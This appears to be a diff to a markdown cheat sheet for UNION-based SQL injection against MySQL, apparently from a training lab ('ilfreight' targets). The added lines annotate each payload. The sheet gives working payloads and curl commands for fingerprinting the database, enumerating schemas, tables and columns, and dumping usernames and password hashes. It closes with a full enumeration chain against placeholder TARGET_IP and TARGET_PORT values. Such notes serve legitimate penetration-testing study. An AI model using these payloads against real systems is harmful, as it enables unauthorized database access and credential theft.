@@ -4,7 +4,7 @@
 
 ## MySQL Fingerprinting
 
-Confirm you're dealing with MySQL before running MySQL-specific queries:
+Confirm you are dealing with MySQL before running MySQL-specific queries:
 
 | Payload | Expected output | Notes |
 |---------|----------------|-------|
@@ -15,8 +15,9 @@ Confirm you're dealing with MySQL before running MySQL-specific queries:
 ```sql
 cn' UNION select 1,@@version,3,4-- -
 ```
+> Retrieves the database version string. If you see it in the response, UNION injection is working and the database is MySQL or MariaDB.
 
-> IIS + error → likely MSSQL. Apache/Nginx + Linux → likely MySQL/MariaDB.
+> IIS (Microsoft's web server) + an error usually means MSSQL. Apache or Nginx on Linux usually means MySQL or MariaDB.
 
 ---
 
@@ -36,8 +37,7 @@ cn' UNION select 1,@@version,3,4-- -
 ```sql
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
-
-> Ignore defaults: `mysql`, `information_schema`, `performance_schema`, `sys`. Everything else is user data.
+> Lists all databases on the server. Ignore the built-in ones: `mysql`, `information_schema`, `performance_schema`, and `sys`. Everything else is application data worth investigating.
 
 ---
 
@@ -46,6 +46,7 @@ cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```sql
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 ```
+> Lists all tables in the `dev` database. Replace `dev` with the database name you found in step 1. `TABLE_NAME` goes in a visible column so it appears in the response.
 
 - `TABLE_NAME` — table name
 - `TABLE_SCHEMA` — which database it belongs to
@@ -58,6 +59,7 @@ cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES wher
 ```sql
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 ```
+> Lists all columns in the `credentials` table. Replace `credentials` with the table name you found in step 2. The column names in the response tell you what data you can dump in step 4.
 
 - `COLUMN_NAME` — column name
 - Filter by `table_name` to target a specific table
@@ -74,6 +76,7 @@ cn' UNION select 1,username,password,4 from dev.credentials-- -
 -- Target specific rows:
 cn' UNION select 1,password,3,4 from ilfreight.users where username='newuser'-- -
 ```
+> Dumps data from a specific table using dot notation (`db.table`). Use this when the target data is in a different database than the current one. Replace `dev.credentials` and column names with values from step 3. Add a `WHERE` clause to target a specific row.
 
 ---
 
@@ -91,6 +94,7 @@ cn' UNION select 1,password,3,4 from ilfreight.users where username='newuser'-- 
 ```bash
 curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+select+1,password,3,4+from+ilfreight.users+where+username=%27newuser%27--+-"
 ```
+> Retrieves the password hash for `newuser` via UNION injection. URL-encoded: `%27` = `'`, `+` = space, `%27` around the username value. Replace `TARGET_IP`, `TARGET_PORT`, and the username value with your target's values.
 
 **Result:**
 ```
@@ -122,6 +126,7 @@ curl -s "${TARGET}cn%27+UNION+select+1,COLUMN_NAME,TABLE_NAME,4+from+INFORMATION
 # Dump data
 curl -s "${TARGET}cn%27+UNION+select+1,username,password,4+from+TARGET_DB.TARGET_TABLE--+-"
 ```
+> Full four-step UNION enumeration chain. Set `TARGET` to your base URL once. Replace `TARGET_DB` and `TARGET_TABLE` in each step with the values returned by the previous step. Run each command in sequence: fingerprint → databases → tables → columns → data dump.
 
 ---
 
